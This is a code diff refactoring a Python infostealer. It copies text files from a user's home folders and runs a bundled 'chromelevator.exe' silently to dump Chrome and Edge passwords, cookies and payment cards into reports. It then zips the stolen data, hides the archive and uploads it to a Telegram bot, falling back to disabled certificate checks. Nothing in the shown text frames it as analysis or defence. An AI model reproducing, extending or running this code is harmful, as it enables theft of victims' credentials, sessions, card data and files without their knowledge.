@@ -34,15 +34,16 @@ pyautogui.FAILSAFE = False
 def grab_user_dirs():
     """
     Copies all .txt and .csv files from
-    the user’s Desktop, Documents, Downloads and Pictures
-    into EXTRACT_FOLDER/grabs/<FolderName>.
-    Other files only get an empty placeholder.
+    the user’s Desktop, Downloads, Documents and Pictures
+    into EXTRACT_FOLDER/grabs/<FolderName>. 
+    For any other file type, drops an empty
+    placeholder <original_filename>.txt so you get notified it existed.
     """
     home = os.path.expanduser("~")
     target_root = os.path.join(EXTRACT_FOLDER, "grabs")
     text_exts = {".txt", ".csv"}
 
-    for folder in ("Desktop", "Documents", "Downloads", "Pictures"):
+    for folder in ("Desktop", "Downloads", "Documents", "Pictures"):
         src = os.path.join(home, folder)
         dst = os.path.join(target_root, folder)
         if not os.path.isdir(src):
@@ -52,20 +53,27 @@ def grab_user_dirs():
         for root, _, files in os.walk(src):
             for f in files:
                 src_path = os.path.join(root, f)
-                name, ext = os.path.splitext(f.lower())
+                if not os.path.isfile(src_path):
+                    continue
 
-                if ext in text_exts:
+                name, ext = os.path.splitext(f)
+                if ext.lower() in text_exts:
+                    # copy real text/csv
                     try:
                         shutil.copy2(src_path, os.path.join(dst, f))
-                    except:
+                    except Exception:
                         pass
                 else:
-                    placeholder = os.path.join(dst, f + ".txt")
-                    if not os.path.exists(placeholder):
-                        try:
-                            open(placeholder, "w").close()
-                        except:
-                            pass
+                    # create an empty placeholder .txt
+                    placeholder = f"{f}.txt"
+                    placeholder_path = os.path.join(dst, placeholder)
+                    try:
+                        # if it doesn't exist already, touch it
+                        if not os.path.exists(placeholder_path):
+                            with open(placeholder_path, "w"):
+                                pass
+                    except Exception:
+                        pass
 
 
 
@@ -263,63 +271,77 @@ def run_chrome_elevator(browser_name):
 _elevator_ran = False
 def extr_browser():
     """
-    Only Chrome & Edge: run chromelevator into per-browser folder,
-    convert each .json to .txt and delete the .json.
+    Extract Chrome & Edge data via chromelevator, then convert
+    the JSON dumps (passwords, cookies, payments) into .txt reports
+    and delete the raw .json files.
     """
     global _elevator_ran
     if _elevator_ran:
         return
     _elevator_ran = True
 
-    for short, keyname in (("chrome","Chrome"), ("edge","Edge")):
-        src_data = BROWSERS.get(keyname, "")
-        if not os.path.isdir(src_data):
+    os.makedirs(EXTRACT_FOLDER, exist_ok=True)
+
+    for short, name in (("chrome", "Chrome"), ("edge", "Edge")):
+        src = BROWSERS.get(name, "")
+        if not os.path.isdir(src):
             continue
 
-        out_dir = os.path.join(EXTRACT_FOLDER, keyname)
+        out_dir = os.path.join(EXTRACT_FOLDER, name)
         os.makedirs(out_dir, exist_ok=True)
 
-        # run elevator into out_dir
+        # 1) run chromelevator into that folder
         try:
             subprocess.run(
                 [resource_path("chromelevator.exe"), short, "-o", out_dir],
                 check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                 creationflags=CREATE_NO_WINDOW
             )
-        except:
-            with open(os.path.join(EXTRACT_FOLDER, f"{short}_elevator_error.txt"), "a") as f:
-                f.write(f"{time.ctime()}: elevator failed\n")
+        except Exception:
+            with open(os.path.join(out_dir, f"{short}_elevator_error.txt"), "a") as err:
+                err.write(f"{time.ctime()}: chromelevator for {short} failed\n")
             continue
 
-        # for each profile, turn .json → .txt
+        # 2) for each profile subdir, convert JSON→TXT and delete JSON
         for profile in os.listdir(out_dir):
             prof_dir = os.path.join(out_dir, profile)
             if not os.path.isdir(prof_dir):
                 continue
 
             def json_to_txt(fn, header, fmt):
-                j = os.path.join(prof_dir, fn + ".json")
-                t = os.path.join(prof_dir, fn + ".txt")
-                if not os.path.exists(j):
+                jfile = os.path.join(prof_dir, fn + ".json")
+                tfile = os.path.join(prof_dir, fn + ".txt")
+                if not os.path.isfile(jfile):
                     return
                 try:
-                    arr = json.load(open(j, "r", encoding="utf-8"))
-                    with open(t, "w", encoding="utf-8") as out:
-                        out.write(f"=== {keyname} : {profile} → {header} ===\n\n")
+                    with open(jfile, "r", encoding="utf-8") as jf:
+                        arr = json.load(jf)
+                    with open(tfile, "w", encoding="utf-8") as tf:
+                        tf.write(f"=== {name} | {profile} → {header} ===\n\n")
                         for e in arr:
-                            out.write(fmt(e) + "\n")
+                            tf.write(fmt(e) + "\n")
                 except Exception as e:
-                    open(os.path.join(prof_dir, f"{fn}_error.log"), "w").write(str(e))
+                    with open(os.path.join(prof_dir, f"{fn}_parse_error.log"), "w") as log:
+                        log.write(str(e))
                 finally:
-                    try: os.remove(j)
-                    except: pass
+                    os.remove(jfile)
 
-            json_to_txt("passwords", "Passwords",
-                        lambda e: f"{e.get('origin','')} | {e.get('username','')} | {e.get('password','')}")
-            json_to_txt("cookies", "Cookies",
-                        lambda e: f"{e.get('host','')} | {e.get('name','')} = {e.get('value','')}")
-            json_to_txt("payments", "Payments",
-                        lambda e: f"{e.get('name_on_card','')} {e.get('expiration_month','')}/{e.get('expiration_year','')} → {e.get('card_number','')}")
+            json_to_txt(
+                "passwords", "Passwords",
+                lambda e: f"{e.get('origin','')} | {e.get('username','')} | {e.get('password','')}"
+            )
+            json_to_txt(
+                "cookies", "Cookies",
+                lambda e: f"{e.get('host','')} | {e.get('name','')} = {e.get('value','')}"
+            )
+            json_to_txt(
+                "payments", "Payments",
+                lambda e: (
+                    f"{e.get('name_on_card','')} "
+                    f"{e.get('expiration_month','')}/{e.get('expiration_year','')} → "
+                    f"{e.get('card_number','')}"
+                )
+            )
 
 
     # catch-all for other browsers
@@ -454,46 +476,53 @@ import tempfile
 from requests.exceptions import SSLError, RequestException
 
 def send_zip_to_telegram():
-    import tempfile
-    zip_name = f"{getpass.getuser()}_{datetime.datetime.now():%Y%m%d_%H%M%S}.zip"
-    zip_path = os.path.join(tempfile.gettempdir(), zip_name)
-
-    # collect all files under EXTRACT_FOLDER
-    entries = []
-    for root, dirs, files in os.walk(EXTRACT_FOLDER):
-        for fn in files:
-            if fn == "system_service.exe": continue
-            full = os.path.join(root, fn)
-            rel = os.path.relpath(full, EXTRACT_FOLDER)
-            entries.append((rel, full))
-
-    # sort: text files first, then placeholders, alphabetically
-    entries.sort(key=lambda x: (not x[0].lower().endswith(".txt"), x[0].lower()))
-
-    # create zip
-    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
-        for rel, full in entries:
-            zf.write(full, rel)
-
-    # hide and send
-    subprocess.call(f'attrib +h "{zip_path}"', shell=True)
-    def _post(v=True):
-        with open(zip_path, "rb") as f:
-            return requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                data={"chat_id": CHAT_ID},
-                files={"document": (zip_name, f)},
-                timeout=15, verify=v
-            )
+    zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    # build it in the OS temp folder
+    zip_path = os.path.join(tempfile.gettempdir(), f"{zip_name}.zip")
     try:
-        _post(True)
-    except requests.exceptions.SSLError:
-        _post(False)
+        # 1) Create the ZIP
+        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(EXTRACT_FOLDER):
+                for file in files:
+                    if file == "system_service.exe":
+                        continue
+                    full = os.path.join(root, file)
+                    arc = os.path.relpath(full, EXTRACT_FOLDER)
+                    zipf.write(full, arc)
+
+        # 2) Hide on Windows
+        subprocess.call(f'attrib +h "{zip_path}"', shell=True)
+
+        # helper to post
+        def _post(verify=True):
+            with open(zip_path, "rb") as f:
+                return requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                    data={"chat_id": CHAT_ID},
+                    files={"document": (os.path.basename(zip_path), f)},
+                    timeout=15,
+                    verify=verify
+                )
+
+        # 3) Try with certs, then without on SSL errors
+        try:
+            _post(verify=True)
+        except SSLError:
+            _post(verify=False)
+
+    except RequestException as e:
+        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8") as err:
+            err.write(f"Telegram request failed: {e}\n")
     except Exception as e:
-        open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w").write(str(e))
+        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8") as err:
+            err.write(str(e))
     finally:
-        try: os.remove(zip_path)
-        except: pass
+        # 4) Cleanup
+        try:
+            os.remove(zip_path)
+        except:
+            pass
+
 
 
 import psutil
